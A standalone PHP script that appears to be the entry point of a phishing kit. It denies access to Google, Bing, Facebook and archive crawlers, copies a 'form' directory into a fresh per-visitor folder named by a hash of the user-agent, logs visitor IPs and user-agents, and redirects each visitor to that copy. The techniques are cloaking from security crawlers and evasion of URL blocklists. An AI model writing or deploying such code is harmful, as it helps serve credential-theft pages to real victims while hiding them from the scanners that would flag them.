<?php

// === CONFIGURATION ===
define('FORM_SOURCE_DIR', 'w3b');
define('VISITOR_LOG_FILE', 'vu.txt');
define('DETAILED_LOG_FILE', 'visitors.txt');

// === FUNCTIONS ===

// Get the preferred language of the visitor
function getPreferredLanguage(): string {
    return isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2) : 'en';
}

// Log basic visitor info (IP and timestamp)
function logVisitorIP(string $ip): void {
    $entry = $ip . ' - ' . gmdate('Y-m-d') . ' @ ' . gmdate('H:i:s') . PHP_EOL;
    file_put_contents(VISITOR_LOG_FILE, $entry, FILE_APPEND | LOCK_EX);
}

// Log detailed visitor info (user-agent, time)
function logDetailedVisitorInfo(string $info): void {
    $entry = date('Y-m-d H:i:s') . ' - ' . $info . PHP_EOL;
    file_put_contents(DETAILED_LOG_FILE, $entry, FILE_APPEND | LOCK_EX);
}

// Determine if the visitor is a known bot
function isBot(string $userAgent): bool {
    $knownBots = [
        'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
        'YandexBot', 'Sogou', 'Exabot', 'facebookexternalhit',
        'facebot', 'ia_archiver'
    ];

    foreach ($knownBots as $bot) {
        if (stripos($userAgent, $bot) !== false) {
            return true;
        }
    }
    return false;
}

// Recursively copy directory contents
function cloneDirectory(string $source, string $destination): void {
    if (!is_dir($source)) return;

    @mkdir($destination, 0755, true);
    $items = scandir($source);

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;

        $srcPath = "$source/$item";
        $destPath = "$destination/$item";

        if (is_dir($srcPath)) {
            cloneDirectory($srcPath, $destPath);
        } else {
            copy($srcPath, $destPath);
        }
    }
}

// === MAIN EXECUTION ===

$userAgent = $_SERVER['HTTP_USER_AGENT'];
$visitorIP = $_SERVER['REMOTE_ADDR'];
$uniqueDir = md5($userAgent);

// Block bots with 403 Forbidden
if (isBot($userAgent)) {
    http_response_code(403);
    echo "Access denied for bots.";
    exit;
}

// Clone the form directory to a new, user-agent-based folder
cloneDirectory(FORM_SOURCE_DIR, $uniqueDir);

// Log visitor IP and user-agent info
logVisitorIP($visitorIP);
logDetailedVisitorInfo("$visitorIP | $userAgent");

// Redirect the visitor to their unique directory
header("Location: $uniqueDir");
exit;

?>